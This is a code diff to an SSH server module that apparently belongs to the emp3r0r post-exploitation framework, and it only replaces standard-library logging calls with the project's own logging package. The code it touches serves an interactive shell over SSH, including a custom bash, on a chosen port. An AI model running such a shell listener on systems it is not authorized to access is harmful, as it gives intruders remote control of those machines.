@@ -6,7 +6,7 @@ package ssh
 import (
 	"fmt"
 	"io"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/exec"
 	"strings"
@@ -24,7 +24,7 @@ func setWinsize(f *os.File, w, h int) {
 		Cols: uint16(w),
 	}
 	if err := pty.Setsize(f, winsize); err != nil {
-		log.Printf("error resizing pty: %s", err)
+		logging.Printf("error resizing pty: %s", err)
 	}
 }
 
@@ -34,7 +34,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 	exe, err := exec.LookPath(shell)
 	if err != nil && shell != "sftp" {
 		res := fmt.Sprintf("%s not found (%v), aborting", shell, err)
-		log.Print(res)
+		logging.Print(res)
 		return
 	}
 	ssh_server := ssh.Server{
@@ -54,7 +54,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			custom_bash := common.RuntimeConfig.UtilsPath + "/bash"
 			if !util.IsFileExist(custom_bash) {
 				err = fmt.Errorf("sshd: custom bash not found: %s. Run `vaccine` to install", custom_bash)
-				log.Print(err)
+				logging.Print(err)
 				s.Write([]byte(err.Error()))
 				return
 			}
@@ -62,7 +62,7 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 			err = external_file.ExtractBashRC(custom_bash, bashrc)
 			if err != nil {
 				err = fmt.Errorf("sshd: extract built-in bashrc: %v", err)
-				log.Print(err)
+				logging.Print(err)
 				s.Write([]byte(err.Error()))
 				return
 			}
@@ -82,14 +82,14 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		}
 		cmd.Args = tmp_args
 
-		log.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)
+		logging.Printf("sshd execute: %v, args=%v, env=%s", cmd, cmd.Args, cmd.Env)
 
 		ptyReq, winCh, isPTY := s.Pty()
 		if isPTY {
-			log.Printf("Got an SSH PTY request: %s", ptyReq.Term)
+			logging.Printf("Got an SSH PTY request: %s", ptyReq.Term)
 			cmd.Env = append(cmd.Env, fmt.Sprintf("TERM=%s", ptyReq.Term))
 		} else {
-			log.Print("Got an SSH request, but not a PTY request, aborting")
+			logging.Print("Got an SSH request, but not a PTY request, aborting")
 			s.Write([]byte("Not a PTY request"))
 			return
 		}
@@ -97,46 +97,46 @@ func crossPlatformSSHD(shell, port string, args []string) (err error) {
 		if err != nil {
 			err = fmt.Errorf("start shell with PTY failed: %v", err)
 			io.WriteString(s, err.Error())
-			log.Print(err)
+			logging.Print(err)
 			return
 		}
 
 		go func() {
 			for win := range winCh {
-				log.Printf("set pty size to %dx%d", win.Width, win.Height)
+				logging.Printf("set pty size to %dx%d", win.Width, win.Height)
 				setWinsize(f, win.Width, win.Height)
 			}
 		}()
 		go func() {
 			defer func() {
-				log.Printf("Closing PTY file: %s", f.Name())
+				logging.Printf("Closing PTY file: %s", f.Name())
 				f.Close()
 				if cmd.Process != nil {
 					cmd.Process.Kill()
-					log.Printf("Killed PTY process %d", cmd.Process.Pid)
+					logging.Printf("Killed PTY process %d", cmd.Process.Pid)
 				}
 			}()
 			_, err = io.Copy(f, s) // stdin
 			if err != nil {
 				err = fmt.Errorf("error: IO copy from SSH to PTY: %v", err)
-				log.Print(err)
+				logging.Print(err)
 				io.WriteString(s, err.Error())
 			}
 		}()
 		if !util.IsPIDAlive(cmd.Process.Pid) {
 			err = fmt.Errorf("PTY process %d died prematurely", cmd.Process.Pid)
-			log.Print(err)
+			logging.Print(err)
 			io.WriteString(s, err.Error())
 		}
 		_, err = io.Copy(s, f) // stdout
 		if err != nil {
 			err = fmt.Errorf("error: IO copy from PTY to SSH: %v", err)
-			log.Print(err)
+			logging.Print(err)
 			io.WriteString(s, err.Error())
 		}
 		cmd.Wait()
 	})
 
-	log.Printf("Starting SSHD on port %s...", port)
+	logging.Printf("Starting SSHD on port %s...", port)
 	return ssh_server.ListenAndServe()
 }
